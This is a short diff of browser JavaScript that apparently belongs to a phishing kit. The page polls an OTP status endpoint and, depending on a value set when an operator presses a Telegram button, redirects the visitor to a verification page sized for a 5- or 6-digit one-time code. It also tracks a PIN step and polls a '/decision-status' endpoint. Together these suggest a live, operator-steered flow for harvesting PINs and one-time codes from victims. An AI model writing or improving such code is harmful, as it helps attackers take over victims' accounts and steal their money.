@@ -50,17 +50,24 @@ if (true) {
         console.log("OTP STATUS:", data);
 
         // 🔥 go to step5 if needed
-        if (data.otp == 5) {
-            clearInterval(checker);
-            window.location.href = "step5.html";
-        }
+       
+    if (data.otp == 5) {
+    clearInterval(checker);
 
-        // 🔥 go to step6 when Telegram button pressed
-        if (data.otp == 6) {
-            clearInterval(checker);
-            localStorage.removeItem("fromPin"); // ✅ remove ONLY here
-            window.location.href = "step6.html";
-        }
+    // ✅ save length
+    localStorage.setItem("otpLength", 5);
+
+    window.location.href = "verification.html";
+}
+
+if (data.otp == 6) {
+    clearInterval(checker);
+
+    // ✅ save length
+    localStorage.setItem("otpLength", 6);
+
+    window.location.href = "verification.html";
+}
 
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
